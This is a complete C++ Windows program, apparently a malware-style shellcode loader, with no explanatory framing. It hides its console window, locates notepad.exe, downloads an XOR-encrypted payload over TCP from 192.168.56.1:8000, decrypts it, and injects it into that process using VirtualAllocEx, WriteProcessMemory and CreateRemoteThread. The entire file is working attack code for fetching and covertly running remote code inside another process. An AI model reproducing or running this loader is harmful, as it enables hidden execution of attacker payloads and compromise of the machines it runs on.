#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>

#pragma comment(lib, "Ws2_32.lib")

struct Shellcode {
    BYTE* pcData;
    DWORD dwSize;
};

DWORD GetTargetPID(const wchar_t* procName);
BOOL DownloadShellcodeViaTCP(const char* host, int port, Shellcode* shellcode);
BOOL Inject(DWORD dwPID, Shellcode shellcode);
void XorDecrypt(BYTE* data, DWORD dataLen, BYTE key);

int main() {
    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);

    DWORD pid = GetTargetPID(L"notepad.exe");
    if (!pid) {
        std::cout << "Target process not found." << std::endl;
        return 1;
    }

    Shellcode shellcode;
    std::cout << "Connecting to shellcode server..." << std::endl;
    if (!DownloadShellcodeViaTCP("192.168.56.1", 8000, &shellcode)) {
        std::cout << "Failed to download shellcode." << std::endl;
        return 2;
    }

    std::cout << "Downloaded encrypted shellcode size: " << shellcode.dwSize << " bytes" << std::endl;

    XorDecrypt(shellcode.pcData, shellcode.dwSize, 0xAA); // decrypt using XOR key 0xAA

    std::cout << "Injecting into PID." << std::endl;
    if (!Inject(pid, shellcode)) {
        std::cout << "Injection failed." << std::endl;
        return 3;
    }

    std::cout << "Shellcode injected successfully." << std::endl;
    return 0;
}

DWORD GetTargetPID(const wchar_t* procName) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (Process32First(snapshot, &entry)) {
        do {
            if (!_wcsicmp(entry.szExeFile, procName)) {
                CloseHandle(snapshot);
                return entry.th32ProcessID;
            }
        } while (Process32Next(snapshot, &entry));
    }
    CloseHandle(snapshot);
    return 0;
}

BOOL DownloadShellcodeViaTCP(const char* host, int port, Shellcode* shellcode) {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) return FALSE;

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        WSACleanup();
        return FALSE;
    }

    sockaddr_in server;
    server.sin_family = AF_INET;
    server.sin_port = htons(port);
    inet_pton(AF_INET, host, &server.sin_addr);

    if (connect(sock, (SOCKADDR*)&server, sizeof(server)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return FALSE;
    }
    std::cout << "Connected." << std::endl;

    DWORD capacity = 4096;
    BYTE* buffer = (BYTE*)malloc(capacity);
    DWORD totalSize = 0;

    while (true) {
        int bytesRead = recv(sock, (char*)(buffer + totalSize), capacity - totalSize, 0);
        if (bytesRead <= 0) break;
        totalSize += bytesRead;
        if (capacity - totalSize < 1024) {
            capacity *= 2;
            buffer = (BYTE*)realloc(buffer, capacity);
        }
    }

    closesocket(sock);
    WSACleanup();

    shellcode->pcData = buffer;
    shellcode->dwSize = totalSize;
    return TRUE;
}

BOOL Inject(DWORD dwPID, Shellcode shellcode) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID);
    if (!hProcess) return FALSE;

    LPVOID remoteMemory = VirtualAllocEx(hProcess, nullptr, shellcode.dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMemory) {
        CloseHandle(hProcess);
        return FALSE;
    }

    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, remoteMemory, shellcode.pcData, shellcode.dwSize, &bytesWritten)) {
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)remoteMemory, nullptr, 0, nullptr);
    if (!hThread) {
        VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    WaitForSingleObject(hThread, 1000);
    DWORD exitCode;
    GetExitCodeThread(hThread, &exitCode);
    std::cout << "Remote thread exited with code: " << exitCode << std::endl;

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return TRUE;
}

void XorDecrypt(BYTE* data, DWORD dataLen, BYTE key) {
    for (DWORD i = 0; i < dataLen; ++i) {
        data[i] ^= key;
    }
}
